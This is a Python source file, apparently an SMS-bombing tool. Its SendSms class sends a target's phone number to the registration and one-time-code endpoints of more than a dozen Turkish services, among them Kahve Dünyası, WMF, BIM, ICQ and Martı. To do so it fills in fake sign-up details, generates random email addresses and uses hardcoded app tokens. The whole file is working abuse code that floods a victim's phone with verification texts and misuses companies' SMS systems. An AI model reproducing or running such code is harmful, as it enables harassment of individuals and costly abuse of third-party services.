import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Kahve Dünyası")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Kahve Dünyası")
        

    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1972-05-11",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Recep",
                "gender": "male",
                "last_name": "Tranzer",
                "password": "51dC..abc62",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> WMF")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> WMF")
    
     #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Tıkla Gelsin")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Tıkla Gelsin")
    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
            r = requests.post(url, headers=headers)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Altın Yıldız Classics")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Altın Yıldız Classics")
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> NAOS")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> NAOS")
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> BIM")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> BIM")
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> English Home")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> English Home")
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers)
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> ICQ")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> ICQ")
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> EvIdea")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> EvIdea") 
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Martı Scooter")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Martı Scooter")
    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=headers)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Hey Mobility")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Hey Mobility")
    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V3//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            header= {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/128 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=header)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Bineq Scooter")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Bineq Scooter")
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Tıkla Gelsin")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Tıkla Gelsin")
    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json= {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Taşımacım")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Taşımacım")
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Made by GameVPR | [+] {Style.RESET_ALL}Success! --> Yuffi")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Made by GameVPR | [-] {Style.RESET_ALL}Unable! --> Yuffi")
